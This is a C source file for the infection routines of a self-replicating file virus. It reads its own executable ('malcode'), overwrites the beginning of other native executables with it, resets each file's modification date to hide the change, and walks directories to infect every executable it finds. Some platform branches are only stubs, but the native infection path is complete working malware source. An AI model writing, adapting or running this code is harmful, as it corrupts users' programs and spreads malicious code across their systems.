#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "settings.h"
#include "os.h"
#include "clonelib.h"
#ifndef INT32_MAX
	#define INT32_MAX 2147483647
#endif

Bytes* getOwnBytes(const char* arg0){	
	//Get name of executable
	char* execname;
	#ifdef _WIN32
		if(strcmp(getFileExtension(arg0),"exe\0") && strcmp(getFileExtension(arg0),"com\0")){
			execname=(char*)malloc(sizeof(char)*(strlen(arg0)+4));
			strcpy(execname,arg0);
			strcat(execname,".exe");
		}else{
			execname=(char*)malloc(sizeof(char)*strlen(arg0));
			strcpy(execname,arg0);
		}
	#else
		execname=(char*)malloc(sizeof(char)*strlen(arg0));
		strcpy(execname,arg0);
	#endif

	
	//Open self as malfile
	FILE* malfile=fopen(execname,"rb");
	
	//Check malfile size
	
	fseek(malfile,0,SEEK_END);
	unsigned int malsize=ftell(malfile);
	fseek(malfile,0,SEEK_SET);
	
	//Get malcode
	char* malcode=(char*)malloc(sizeof(char)*malsize);
	fread(malcode,1,malsize,malfile);
	fclose(malfile);
	
	//Put into bytes
	Bytes* bytes=(Bytes*)malloc(sizeof(Bytes));
	bytes->value=(char*)malloc(sizeof(char)*malsize);
	for(unsigned int i=0;i<malsize;i++){
		bytes->value[i]=malcode[i];
	}
	bytes->length=malsize;
	
	//free memory
	free(malcode);
	free(execname);
	
	//Return Bytes struct pointer
	return bytes;
}


bool infectTarget(const char* target, Bytes* malbytes){
	const char* malcode=malbytes->value;
	unsigned int malsize=malbytes->length;
	
	//Get temp directory
	#if defined(_WIN32)
		char* tempdir=(char*)malloc(sizeof(char)*strlen(getenv("TEMP")));
		strcpy(tempdir,getenv("TEMP"));
	#elif defined(__APPLE__) && defined(__MACH__)
		char* tempdir=(char*)malloc(sizeof(char)*strlen(getenv("TEMP")));
		strcpy(tempdir,getenv("TMPDIR"));
	#else
		char* tempdir="/tmp";
	#endif
	
	//Get info from target file
	int64_t tardate=getFileModifiedDate(target);
	
	//Open target file
	FILE* tarfile=fopen(target,"rb");
	if(tarfile==NULL)return 0;
	fseek(tarfile,0,SEEK_END);
	unsigned int tarsize=ftell(tarfile);
	fseek(tarfile,0,SEEK_SET);
	char* tarcode=(char*)malloc(sizeof(char)*tarsize);
	fread(tarcode,1,tarsize,tarfile);
	fclose(tarfile);
	
	/* Not sure if we're actually going to implement this feature
	   It makes it harder to pack the executable beforehand
	
	//Generate alphanumeric key(linkcode)
	char linkcode[LINK_TAG_LENGTH+1];
	srand(time(NULL));
	for(unsigned int i=0;i<LINK_TAG_LENGTH;i++){
		linkcode[i]=(rand()%2)?rand()%10+48:rand()%26+65;
		linkcode[i+1]='\0';
	}
	
	//Find link path
	char* linkpath=(char*)malloc(LINK_TAG_LENGTH+1+strlen(tempdir));
	strcpy(linkpath,tempdir);
	strcat(linkpath,"/.");
	strcat(linkpath,linkcode);
	strcat(linkpath,".exe");
	
	//Copy target to link path
	FILE* linkfile=fopen(linkpath,"wb");
	for(unsigned int i=0;i<tarsize;i++){fprintf(linkfile,"%c",tarcode[i]);}
	fclose(linkfile);
	
	*/
	
	//Clone self to target	
	//malsize=(malsize>12000)?12000:malsize;
	printf("Cloning...(ts:%d,ms:%d)\n",tarsize,malsize);
	tarfile=fopen(target,"wb");
	for(unsigned int i=0;i<malsize;i++){fprintf(tarfile,"%c",malcode[i]);}
	if(tarsize>malsize){
		for(unsigned int i=0;i<(tarsize-malsize);i++)
			fprintf(tarfile,"%c",tarcode[malsize+i]);
	}
	fclose(tarfile);
	setFileModifiedDate(target,tardate);
	
	//Free memory and return
	//free(linkpath);
	free(tarcode);
	#ifndef __linux__
		free(tempdir);
	#endif
	return 1;
}

bool infectDirectory(const char* path, const char* arg0){
	//Get rid of warning
	printf("%s\r",arg0);
	
	//Get list of files
	char** ls=walkDir(path);
	
	//Go through files
	for(unsigned int i=0;strcmp(ls[i],"\0");i++){
		
		//Check if possible executable
		if(!strcmp(getFileExtension(ls[i]),"\0") || !strcmp(getFileExtension(ls[i]),"exe\0")){
			
			//Make sure under 2 GB
			if(getFileSize(ls[i])<=INT32_MAX){
				
				//Check if definite executable
				Executable* exectype=getExecType(ls[i]);
				if(exectype->is_exec){	
					printf("%s",ls[i]);
					if(exectype->is_native ){
						//Copy code
						printf("(native)\n");
						Bytes* bytes=getOwnBytes(arg0);
						printf("%d",infectTarget(ls[i],bytes));
						free(bytes);
						
					}else{
						if(exectype->is_win){
							//Get windows binary
							printf("(windows)");
							
						}else if(exectype->is_elf){
							//Get elf/linux binary
							printf("(elf)");
							
						}else if(exectype->is_macho){
							//Get OSX binary
							printf("(mach-o)");
							
						}else{
							printf("Error(clonelib.c) - No platform\n");
							return false;
						}
						//Copy code from external binary
					}
					printf("\n");
				}
				//Free memory
				free(exectype);
				free(ls[i]);
			}
		}
	}
	
	free(ls);
	return true;
}